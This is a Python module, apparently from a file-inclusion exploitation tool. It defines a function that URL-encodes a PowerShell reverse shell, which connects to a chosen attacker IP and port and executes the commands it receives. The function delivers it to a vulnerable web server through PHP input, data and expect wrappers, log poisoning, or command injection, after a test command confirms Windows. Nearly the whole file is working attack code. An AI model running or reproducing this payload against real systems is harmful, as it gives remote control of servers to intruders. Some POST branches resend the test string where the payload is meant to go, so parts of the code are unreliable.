from src.httpreqs import request
from src.utils.info import printInfo
from src.utils.arguments import args
from src.attacks.logPoison import exploit_log_poison
from src.configs import config
from src.utils.encodings import encode
from src.utils.args_check import headers

def exploit_powershell(exploit, method, ip, port):

    url = exploit['GETVAL']
    post = exploit['POSTVAL']

    powershellTest = "powershell.exe%20ipconfig"
    powershellPayload =  "powershell+-nop+-c+\"$client+%3d+New-Object+System.Net.Sockets.TCPClient('{IP}',{PORT})%3b$stream+%3d+$client."\
                         "GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data"\
                         "+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$"\
                         "sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream"\
                         ".Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()\" "
    
    powershellPayload = powershellPayload.replace("{IP}", ip)
    powershellPayload = powershellPayload.replace("{PORT}", str(port))
    
    if(method == "INPUT"):
        res, _ = request.REQUEST(url.replace(config.tempArg, encode(powershellTest)), args.httpheaders, post, config.proxies, "", "", exploit =  True)
        if("Windows IP Configuration" in res.text):
            u = url.replace(config.tempArg, encode(powershellPayload))
            request.REQUEST(u, args.httpheaders, exploit['POSTVAL'], config.proxies, "", "", exploit =  True)
            printInfo(ip, port, "powershell", "input wrapper")
            return True
    if(method == "DATA"):
        if(args.postreq):
            res, _ = request.REQUEST(url.replace(config.tempArg, encode(powershellTest)), args.httpheaders, post, config.proxies, "", "", exploit =  True)
        else: 
            res,_ = request.REQUEST(url.replace(config.tempArg, encode(powershellTest)), args.httpheaders, "", config.proxies, "", "", exploit =  True)
        if("Windows IP Configuration" in res.text):
            printInfo(ip, port, "powershell", "data wrapper")
            u = url.replace(config.tempArg, encode(powershellPayload))
            if(args.postreq): 
                request.REQUEST(url.replace(config.tempArg, encode(powershellTest)), args.httpheaders, post, config.proxies, "", "", exploit =  True)
            else: 
                request.REQUEST(u, args.httpheaders, "", config.proxies, "", "", exploit =  True)
            return True
    if(method == "EXPECT"):
            if(args.postreq):
                res, _ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(powershellTest)), config.proxies, "", "", exploit =  True)
            else:
                res, _ = request.REQUEST(url.replace(config.tempArg, encode(powershellTest)), args.httpheaders, "", config.proxies, "", "", exploit =  True)
            if("Windows IP Configuration" in res.text):
                u = url.replace(config.tempArg, encode(powershellPayload))
                printInfo(ip, port, "powershell", "expect wrapper")
                if(args.postreq):
                    request.REQUEST(url, args.httpheaders, post.replace(config.tempArg,  encode(powershellTest)), config.proxies, "", "", exploit =  True)
                else: 
                    request.REQUEST(u, args.httpheaders, "", config.proxies, "", "", exploit =  True)
                return True
    if(method == "TRUNC"):
        exploit_log_poison(ip, port, url, encode(powershellPayload), "", encode(powershellTest), "Windows IP Configuration", exploit['POSTVAL'])
        return True

    if(method == "CMD"):
        if(args.postreq):
            res, _ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(powershellTest)), config.proxies, "", "", exploit =  True)
        else: 
            res, _ = request.REQUEST(url.replace(config.tempArg, encode(powershellTest)), args.httpheaders, "", config.proxies, "", "", exploit =  True)
        if("Windows IP Configuration" in res.text):
            printInfo(ip, port, "powershell", "command injection")
            if(args.postreq):
                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(powershellPayload)), config.proxies, "", "", exploit =  True)
            else:
                request.REQUEST(url.replace(config.tempArg, encode(powershellPayload)), args.httpheaders, "", config.proxies, "", "", exploit =  True)
            return True